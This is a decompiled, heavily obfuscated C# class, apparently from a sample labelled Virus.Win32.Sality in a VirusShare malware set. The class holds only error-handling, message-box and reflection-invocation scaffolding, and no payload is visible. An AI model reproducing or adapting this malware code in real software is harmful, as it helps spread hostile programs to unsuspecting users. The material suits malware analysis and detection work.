﻿// Decompiled with JetBrains decompiler
// Type: .
// Assembly: a5b7ee8e-cbdf-4eff-9144-efd0c433f3fe, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 97CE9FDF-0921-44CB-AE13-1E9A2A550F0F
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00000-msil\Virus.Win32.Sality.sil-9eb937e4a3faa7c29e8cc85118a5c87d65f8716c89e5d1b13d7d7bc334ec8975.exe

using \u0001;
using \u0005;
using \u0006;
using System;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Windows.Forms;

namespace \u0006
{
  internal sealed class \u0003 : \u0003.\u0006
  {
    [NonSerialized]
    internal new static \u0002 \u0001;

    protected override void \u0003([In] \u0004.\u0004 obj0)
    {
      \u0006.\u0004 obj = new \u0006.\u0004(obj0);
      int num = (int) \u0013\u0003.\u007E\u008C\u0002((object) obj);
    }

    protected override void \u0003([In] \u0002 obj0)
    {
      \u0002 obj = new \u0002((\u0003.\u0006) this, obj0);
      int num = (int) \u0013\u0003.\u007E\u008C\u0002((object) obj);
    }

    protected override void \u0003([In] \u0004.\u0005 obj0)
    {
      int num = (int) \u009B\u0003.\u0092\u0002(\u0003\u0006.\u007E\u0013\u0003((object) obj0.\u0003()), \u0086\u0005.\u0092\u0003(\u0006.\u0003.\u0001(4692), (object) \u0006.\u0003.\u0001(4328)), MessageBoxButtons.OK, MessageBoxIcon.Hand);
    }

    public static bool \u0004()
    {
      try
      {
        \u0003.\u0006.\u0003((\u0003.\u0006) new \u0006.\u0003());
        return true;
      }
      catch (SecurityException ex1)
      {
        try
        {
          try
          {
            // ISSUE: type reference
            object obj = \u008B\u0005.\u000F\u0005((object) \u0084\u0003.\u0012\u0005(__typeref (Application)), \u0006.\u0003.\u0001(4721), BindingFlags.Static | BindingFlags.Public | BindingFlags.InvokeMethod, (Binder) null, (object) null, (object[]) null);
          }
          catch (MissingMethodException ex2)
          {
          }
          \u0006.\u0004 obj1 = new \u0006.\u0004(new \u0004.\u0004(\u0086\u0005.\u0092\u0003(\u0006.\u0003.\u0001(4746), (object) \u0006.\u0003.\u0001(4328)), false));
          \u000E\u0003.\u007E\u0086\u0002((object) obj1, true);
          int num = (int) \u0013\u0003.\u007E\u008C\u0002((object) obj1);
        }
        catch (Exception ex3)
        {
          int num = (int) \u009B\u0003.\u0092\u0002(\u0003\u0006.\u007E\u0013\u0003((object) ex3), \u0086\u0005.\u0092\u0003(\u0006.\u0003.\u0001(4692), (object) \u0006.\u0003.\u0001(4328)), MessageBoxButtons.OK, MessageBoxIcon.Hand);
        }
        return false;
      }
    }

    static \u0003() => \u0001.\u0003.\u0003();
  }
}